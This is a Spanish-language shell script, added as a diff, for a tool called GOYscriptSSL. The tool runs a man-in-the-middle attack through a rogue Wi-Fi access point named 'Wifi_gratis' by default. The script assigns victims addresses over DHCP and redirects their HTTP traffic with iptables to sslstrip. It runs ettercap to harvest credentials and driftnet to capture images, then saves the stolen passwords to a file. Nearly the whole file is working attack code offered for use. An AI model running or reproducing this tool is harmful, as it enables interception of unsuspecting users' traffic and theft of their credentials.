@@ -1,0 +1,537 @@
+#!/bin/sh
+
+# LISTA DE CAMBIOS
+# versión 3.1
+#	- Versión inicial:
+#	      script inspirado en airssl.sh creado por killadaninja
+#	      crea un ataque MITM (man in the middle)
+# versión 3.4
+#	- Ahora se muestra la ruta completa donde se guardan los resultados
+
+
+negro="\033[0;30m"
+rojo="\033[0;31m"
+verde="\033[0;32m"
+marron="\033[0;33m"
+azul="\033[0;34m"
+magenta="\033[0;35m"
+cyan="\033[01;36m"
+grisC="\033[0;37m"
+gris="\033[1;30m"
+rojoC="\033[1;31m"
+verdeC="\033[1;32m"
+amarillo="\033[1;33m"
+azulC="\033[1;34m"
+magentaC="\033[1;35m"
+cyanC="\033[1;36m"
+blanco="\033[1;37m"
+subrayar="\E[4m"
+parpadeo="\E[5m"
+normal="\E[0m"
+resaltar="\E[7m"
+
+AIRMON="software/airmon-ng"
+AIRBASE="software/airbase-ng"
+FABRICANTE="software/./fabricante.sh"
+MOSTRAR_CLAVES="software/./goyscriptSSL_mostrar_claves.sh"
+CAPTURA="ssl"
+TMP="tmp"
+FECHA_IMAGENES=`date +%d-%m-%Y_%H.%M`
+FECHA_Y_HORA=`date +%d/%m/%Y-%H:%M`
+
+#COMPRUEBA SI ESTÁN DISPONIBLES TODOS LOS COMANDOS NECESARIOS PARA EJECUTAR EL SCRIPT
+comprobar_comandos()
+{
+COMANDOS='iwconfig
+ip
+egrep
+grep
+ping
+sslstrip
+driftnet
+ettercap
+ifconfig
+route
+uniq
+iptables
+dhcpcd
+xterm'
+echo -e $cyanC"Comprobando la disponibilidad de los comandos:"
+echo -e $grisC
+let CUANTOS_COMANDOS=`echo "$COMANDOS" | wc -l`
+let CONT=1
+let FALLO=0
+while [ $CONT -le $CUANTOS_COMANDOS ]
+do
+	COMANDO=`echo "$COMANDOS" | sed -n ${CONT}p`
+	echo -en $cyanC"    Comprobando $blanco$COMANDO$cyanC... "
+	which "$COMANDO" >/dev/null 2>&1
+	if [ $? -eq 0 ]
+	then
+		echo -e $verdeC"OK"
+	else
+		echo -e $rojoC"NO DISPONIBLE"
+		let FALLO=$FALLO+1
+	fi
+	let CONT=$CONT+1
+done
+sleep 1
+if [ $FALLO -ge 1 ]
+then
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+fi
+echo -e $grisC
+}
+
+#COMPRUEBA SI HAY INTERFACES EN MODO MONITOR Y, SI LAS HAY, LAS DESACTIVA
+desactivar_todos_monX()
+{
+INTERFACES_MONITOR=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep mon`
+let CUANTAS=`echo "$INTERFACES_MONITOR" | wc -l`
+if [ "$INTERFACES_MONITOR" != "" ]
+then
+	echo -e $cyanC"Desactivando modo monitor..."
+	echo -e $grisC
+fi
+let CONT=1
+while [ $CONT -le $CUANTAS ]
+do
+	MON=`echo "$INTERFACES_MONITOR" | sed -n ${CONT}p`
+	$AIRMON stop $MON > /dev/null 2>&1
+	let CONT=$CONT+1
+done
+}
+
+comprobar_permisos_solo_lectura()
+{
+rm -rf "prueba_permisos" > /dev/null 2>&1
+mkdir "prueba_permisos" > /dev/null 2>&1
+if [ $? -ne 0 ]
+then
+	echo -e $grisC
+	echo -e $rojoC"  ERROR: El dispositivo está montado como sólo lectura"
+	echo -e $cyanC"         Prueba a volver a montarlo con:"
+	echo -e $cyanC"         mount -o remount,rw <punto_de_montaje>"
+	echo -e $grisC
+	echo -e $cyanC"         Ejemplo:"
+	echo -e $cyanC"             mount -o remount,rw /mnt/sdb1"
+	echo -e $grisC
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+else
+	rm -rf "prueba_permisos" > /dev/null 2>&1
+fi
+}
+
+#NOMBRE Y VERSIÓN DEL SCRIPT
+version()
+{
+VERSION=$(cat VERSION)
+SCRIPT=" GOYscriptSSL $VERSION by GOYfilms "
+N_SCRIPT=${#SCRIPT}
+N_VERSION=${#VERSION}
+let CARACTERES=$N_SCRIPT*3
+LINEA=`echo "══════════════════════════════════════════" | cut -c-${CARACTERES}`
+clear
+echo -e "$blanco\c"
+echo -e "╔${LINEA}╗"
+echo -e "║${SCRIPT}║"
+echo -e "╚${LINEA}╝"
+echo -e $grisC"      Basado en airssl.sh"
+echo -e $grisC"    creado por killadaninja"
+echo -e $grisC
+}
+
+#ESPERA A QUE SE PULSE UNA TECLA
+pulsar_una_tecla()
+{
+echo
+echo -e $blanco"$1"$grisC" \c"
+read -n 1 TECLA
+echo
+echo
+if [ "$1" = "Pulsa una tecla para salir..." ]
+then
+	exit
+fi
+}
+
+comprobar_cuantas_interfaces()
+{
+INTERFACES=`ip link | egrep "^[0-9]+" | awk -F ': ' '{print $2}' | grep -v lo`
+CUANTAS_INTERFACES=`echo "$INTERFACES" | wc -l`
+case $CUANTAS_INTERFACES in
+1)
+	if [ "$INTERFACES" = "" ] #si no se ha detectado ninguna la variable estará vacía
+	then
+		echo -e $rojoC"ERROR: No se ha detectado ninguna tarjeta de red"
+		echo -e $cyanC"       Se necesitan 2 para poder ejecutar este script"
+		echo -e $grisC
+	else #sinó es que sólo se ha detectado una
+		echo -e $rojoC"ERROR: Sólo se ha detectado una tarjeta de red"
+		echo -e $cyanC"       Se necesitan 2 para poder ejecutar este script"
+		echo -e $grisC
+	fi
+	pulsar_una_tecla "Pulsa una tecla para salir...";;
+*) #si se han detectado más, podemos continuar
+	echo -e $verdeC"Se han detectado $blanco$CUANTAS_INTERFACES$verdeC interfaces de red"
+	echo -e $grisC;;
+esac
+}
+
+comprobar_conexion_internet()
+{
+let CONT=1
+while [ $CONT -le $CUANTAS_INTERFACES ]
+do
+	INTERFAZ=`echo "$INTERFACES" | sed -n ${CONT}p`
+	echo -en $cyanC"Comprobando conexión a Internet en $blanco$INTERFAZ$cyanC... "
+	ping -c 1 -I "$INTERFAZ" www.google.com >/dev/null 2>&1
+	if [ $? -eq 0 ]
+	then
+		echo -e $verdeC"CONECTADO"
+		INTERFAZ_INTERNET="$INTERFAZ"
+	else
+		echo -e $rojoC"NO CONECTADO"
+	fi
+	let CONT=$CONT+1
+done
+if [ "$INTERFAZ_INTERNET" = "" ]
+then
+	echo -e $grisC
+	echo -e $rojoC"  ERROR: Ninguna de las $CUANTAS_INTERFACES tarjetas de red"
+	echo -e $rojoC"         está conectada a Internet."
+	echo -e $cyanC"         Necesitas conectar a Internet una de"
+	echo -e $cyanC"         ellas para que el script funcione."
+	echo -e $grisC
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+fi
+PUERTA_ENLACE_IP=`ip route show | sed -n 1p | awk '{print $3}'`
+if [ "$PUERTA_ENLACE_IP" = "lo" ] || [ "$PUERTA_ENLACE_IP" = "" ]
+then
+	echo -e $rojoC"ERROR: Puerta de enlace no configurada"
+	echo -e $grisC
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+else
+	echo -e $grisC
+	echo -e $verdeC"    Puerta de enlace...............: $blanco$PUERTA_ENLACE_IP"
+fi
+echo -e $grisC
+echo -e $verdeC"    Interfaz conectada a Internet..: $blanco$INTERFAZ_INTERNET"
+echo -e $grisC
+}
+
+seleccionar_interfaz_AP_falso()
+{
+RESTO_INTERFACES=`iwconfig --version | grep "Recommend" | awk '{print $1}' | grep -v "$INTERFAZ_INTERNET"` #todas las interfaces inalámbricas menos la que está conectada a internet
+CUANTAS_RESTO_INTERFACES=`echo "$RESTO_INTERFACES" | wc -l` #cuantas quedan
+if [ "$RESTO_INTERFACES" = "" ] #si no quedan interfaces de red inalámbricas disponibles
+then
+	echo -e $rojoC"ERROR: No hay interfaces inalámbricas disponibles"
+	echo -e $cyanC"       Si sólo dispones de una interfaz inalámbrica"
+	echo -e $cyanC"       sólo tienes 2 posibles opciones:"
+	echo -e $cyanC"          1- Conseguir otra"
+	echo -e $cyanC"          2- Conectar la tarjeta LAN a Internet y"
+	echo -e $cyanC"             usar la inalámbrica para crear el AP falso"
+	echo -e $grisC
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+else
+	if [ $CUANTAS_RESTO_INTERFACES -eq 1 ] #si sólo queda una
+	then
+		INTERFAZ_FALSO_AP="$RESTO_INTERFACES" #será la que usemos para crear el AP falso
+	else #sinó seleccionaremos una de las que quedan
+		let CONT=1
+		echo -e $cyanC"Interfaces disponibles:"
+		echo -e $grisC
+		while [ $CONT -le $CUANTAS_RESTO_INTERFACES ]
+		do
+			INTERFAZ=`echo "$RESTO_INTERFACES" | sed -n ${CONT}p`
+			MAC_INTERFAZ=`ifconfig "$INTERFAZ" | grep -oE '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | awk '{print toupper($0)}'` #extraemos la MAC
+			FABRICANTE_INTERFAZ=`$FABRICANTE $MAC_INTERFAZ`
+			echo -e $blanco"  $CONT) $cyanC$INTERFAZ $grisC[$MAC_INTERFAZ] [$FABRICANTE_INTERFAZ]"
+			let CONT=$CONT+1
+		done
+		echo -e $grisC
+		echo -en $cyanC"Selecciona una para crear el AP falso: $amarillo"
+		read -n 10 OPCION
+		while [[ $OPCION -lt 1 ]] || [[ $OPCION -gt $CUANTAS_RESTO_INTERFACES ]]
+		do
+			echo -en "\033[1A"
+			echo -en $cyanC"\rSelecciona una para crear el AP falso: \033[K$amarillo"
+			read -n 10 OPCION
+		done
+		INTERFAZ_FALSO_AP=`echo "$RESTO_INTERFACES" | sed -n ${OPCION}p`
+		echo -e $grisC
+	fi
+fi
+echo -e $verdeC"    Interfaz para crear AP falso...: $blanco$INTERFAZ_FALSO_AP"
+echo -e $grisC
+}
+
+introducir_ESSID_AP_falso()
+{
+echo -en $cyanC"Introduce un nombre para el AP falso [ENTER=Wifi_gratis]: $amarillo"
+read ESSID_AP_falso
+if [ "$ESSID_AP_falso" = "" ]
+then
+	ESSID_AP_falso="Wifi_gratis"
+fi
+echo -e $grisC
+echo -e $verdeC"    Nombre del AP falso............: $blanco$ESSID_AP_falso"
+echo -e $grisC
+}
+
+matar_procesos()
+{
+killall -q sslstrip &> /dev/null 2>&1
+killall -q driftnet &> /dev/null 2>&1
+killall -q airbase-ng &> /dev/null 2>&1
+killall -q ettercap &> /dev/null 2>&1
+killall -q looparse &> /dev/null 2>&1
+}
+
+activar_modo_monitor_interfaz_ap_falso()
+{
+echo -en $cyanC"Activando modo monitor en $blanco$INTERFAZ_FALSO_AP  "
+$AIRMON start "$INTERFAZ_FALSO_AP" >/dev/null 2>&1
+INTERFAZ_FALSO_AP_MONITOR="mon0"
+echo -e $grisC
+echo -e $grisC
+}
+
+crear_DHCPD()
+{
+echo -e $cyanC"Creando DHCPD..."
+SUBRED=`ip route show | sed -n 2p | cut -d '/' -f1`
+if [ "$SUBRED" = "10.0.0.0" ]
+then
+	SUBRED="192.168.1.0"
+	PUERTA_ENLACE="192.168.1.1"
+	RANGO="192.168.1.20 192.168.1.50"
+else
+	SUBRED="10.0.0.0"
+	PUERTA_ENLACE="10.0.0.1"
+	RANGO="10.0.0.20 10.0.0.50"
+fi
+mkdir -p "$TMP" >/dev/null 2>&1
+mkdir -p "$CAPTURA" >/dev/null 2>&1
+echo "authoritative;
+
+default-lease-time 600;
+max-lease-time 7200;
+
+subnet $SUBRED netmask 255.255.255.0 {
+option routers $PUERTA_ENLACE;
+option subnet-mask 255.255.255.0;
+
+option domain-name "\"$ESSID_AP_falso\"";
+option domain-name-servers $PUERTA_ENLACE;
+
+range $RANGO;
+
+}" > "$TMP/dhcpd.conf"
+echo -e $grisC
+}
+
+iniciar_AP_falso()
+{
+echo -e $cyanC"Iniciando AP falso..."
+xterm -bg black -fg green -geometry 90x25+1+0 -T "AP falso [$ESSID_AP_falso] en [$INTERFAZ_FALSO_AP/$INTERFAZ_FALSO_AP_MONITOR]" -e $AIRBASE -c 1 -e "$ESSID_AP_falso" $INTERFAZ_FALSO_AP_MONITOR &
+PID_AP_FALSO=$!
+sleep 2
+echo -e $grisC
+}
+
+configurar_tablas()
+{
+echo -e $cyanC"Configurando tablas de reenvío..."
+ifconfig lo up
+ifconfig at0 up &
+sleep 1
+ifconfig at0 $PUERTA_ENLACE netmask 255.255.255.0
+ifconfig at0 mtu 1400
+route add -net $SUBRED netmask 255.255.255.0 gw $PUERTA_ENLACE
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+echo 1 > /proc/sys/net/ipv4/ip_forward
+iptables -t nat -A PREROUTING -p udp -j DNAT --to $PUERTA_ENLACE_IP
+iptables -P FORWARD ACCEPT
+iptables --append FORWARD --in-interface at0 -j ACCEPT
+iptables --table nat --append POSTROUTING --out-interface $INTERFAZ_INTERNET -j MASQUERADE
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+echo -e $grisC
+}
+
+configurar_DHCP()
+{
+echo -e $cyanC"Iniciando servidor DHCP...$grisC"
+touch /var/run/dhcpd.pid
+xterm -bg black -fg green -geometry 90x25-1+0 -T "DHCP" -e dhcpd -d -f -cf "$TMP/dhcpd.conf" at0 &
+PID_DHCP=$!
+sleep 2
+echo -e $grisC
+}
+
+iniciar_sslstrip()
+{
+echo -e $cyanC"Iniciando sslstrip...$grisC"
+sslstrip -f -p -k -l 10000 -w "$TMP/sslstrip.log" 2>/dev/null &
+PID_SSLSTRIP=$!
+sleep 2
+echo -e $grisC
+}
+
+iniciar_ettercap()
+{
+echo -e $cyanC"Iniciando ettercap...$grisC"
+xterm -bg black -fg green -geometry 90x25+1-0 -T "ettercap" -s -sb -si +sk -sl 5000 -e ettercap -p -u -T -q -w "$TMP/etter.cap" -i at0 &
+PID_ETTERCAP=$!
+echo -e $grisC
+}
+
+ventana_claves()
+{
+xterm -bg black -fg green -geometry 90x25-1-0 -T "Contraseñas" -e "$MOSTRAR_CLAVES" &
+PID_MOSTRAR_CLAVES=$!
+}
+
+iniciar_driftnet()
+{
+echo -e $cyanC"Iniciando driftnet..."
+mkdir -p "$TMP/Imagenes_$FECHA_IMAGENES"
+driftnet -i at0 -a -d $TMP/Imagenes_$FECHA_IMAGENES >/dev/null &
+PID_DRIFTNET=$!
+sleep 2
+echo -e $grisC
+echo -e $grisC
+}
+
+informar_activacion()
+{
+echo -e $amarillo"Fecha y hora de inicio...: $blanco$FECHA_Y_HORA"
+echo -e $grisC
+echo -e $verdeC"GOYscriptSSL se está ejecutando."
+echo -e $verdeC"En cuanto la víctima se conecte e introduzca"
+echo -e $verdeC"sus credenciales se mostrarán en la ventana"
+echo -e $verdeC"de Ettercap y en la de Contraseñas."
+echo -e $grisC
+echo -e $grisC
+}
+
+pulsar_tecla_para_finalizar()
+{
+echo -en $blanco"Pulsa 'F' cuando acabes para cerrar todos los procesos...  "
+read -n 1 TECLA
+while [ "$TECLA" != "F" ] && [ "$TECLA" != "f" ]
+do
+	echo -en $blanco"\rPulsa 'F' cuando acabes para cerrar todos los procesos...  \033[K"
+	read -n 1 TECLA
+done
+echo -e $grisC
+echo -e $grisC
+}
+
+guardar_resultados()
+{
+RUTA=`pwd`
+cat $TMP/sslstrip.log |
+if [ -f "$TMP/claves_ssl.txt" ] #si se han encontrado contraseñas las guardamos
+then
+	echo "" >> "$CAPTURA/claves.txt"
+	echo "================" >> "$CAPTURA/claves.txt"
+	echo "$FECHA_Y_HORA" >> "$CAPTURA/claves.txt" #añadimos la fecha y hora al archivo de contraseñas
+	echo "================" >> "$CAPTURA/claves.txt"
+	cat "$TMP/claves_ssl.txt" >> "$CAPTURA/claves.txt"
+	if [ -f "$CAPTURA/claves.txt" ]
+	then
+		echo -e $verdeC"Contraseñas guardadas en $blanco\"$RUTA/$CAPTURA/claves.txt\""
+	else
+		echo -e $rojoC"Error al guardar las contraseñas"
+	fi
+else
+	echo -e $rojoC"No se han obtenido contraseñas en esta sesión"
+fi
+echo -e $grisC
+
+mv -f "$TMP/Imagenes_$FECHA_IMAGENES" "$CAPTURA" #movemos la carpeta de imágenes
+if [ -d "$CAPTURA/Imagenes_$FECHA_IMAGENES" ] #comprobamos si ha sido movida correctamente
+then
+	echo -e $verdeC"Imágenes guardadas en $blanco\"$RUTA/$CAPTURA/Imagenes_$FECHA_IMAGENES\""
+else
+	echo -e $rojoC"Error al guardar las imágenes"
+fi
+echo -e $grisC
+
+mv -f "$TMP/etter.cap" "$CAPTURA/captura_ettercap.cap" #movemos el archivo de captura de ettercap
+if [ -f "$CAPTURA/captura_ettercap.cap" ]
+then
+	echo -e $verdeC"Archivo de captura guardado en $blanco\"$RUTA/$CAPTURA/captura_ettercap.cap\""
+else
+	echo -e $rojoC"Error al guardar el archivo de captura"
+fi
+echo -e $grisC
+
+echo -e $cyanC"Finalizando procesos y borrando tablas IP..."
+echo -e $grisC
+
+kill ${PID_AP_FALSO} &>/dev/null 2>&1
+kill ${PID_DHCP} &>/dev/null 2>&1
+kill ${PID_SSLSTRIP} &>/dev/null 2>&1
+kill ${PID_ETTERCAP} &>/dev/null 2>&1
+kill ${PID_DRIFTNET} &>/dev/null 2>&1
+kill ${PID_MOSTRAR_CLAVES} &>/dev/null 2>&1
+
+desactivar_todos_monX
+
+echo "0" > /proc/sys/net/ipv4/ip_forward
+
+iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+
+echo -e $verdeC"Todos los procesos han sido finalizados"
+echo -e $grisC
+}
+
+comprobar_root()
+{
+USUARIO=`whoami`
+if [ "$USUARIO" != "root" ]
+then
+	echo -e $grisC
+	echo -e $rojoC"ERROR: Necesitas permisos de root para poder"
+	echo -e $rojoC"       ejecutar este script"
+	echo -e $grisC
+	pulsar_una_tecla "Pulsa una tecla para salir..."
+fi
+}
+
+
+### PROGRAMA PRINCIPAL ###
+
+version
+comprobar_permisos_solo_lectura
+comprobar_root
+comprobar_comandos
+version
+matar_procesos
+desactivar_todos_monX
+comprobar_cuantas_interfaces
+comprobar_conexion_internet
+seleccionar_interfaz_AP_falso
+introducir_ESSID_AP_falso
+activar_modo_monitor_interfaz_ap_falso
+crear_DHCPD
+iniciar_AP_falso
+configurar_tablas
+configurar_DHCP
+iniciar_sslstrip
+iniciar_ettercap
+ventana_claves
+iniciar_driftnet
+informar_activacion
+pulsar_tecla_para_finalizar
+guardar_resultados
+pulsar_una_tecla "Pulsa una tecla para salir..."
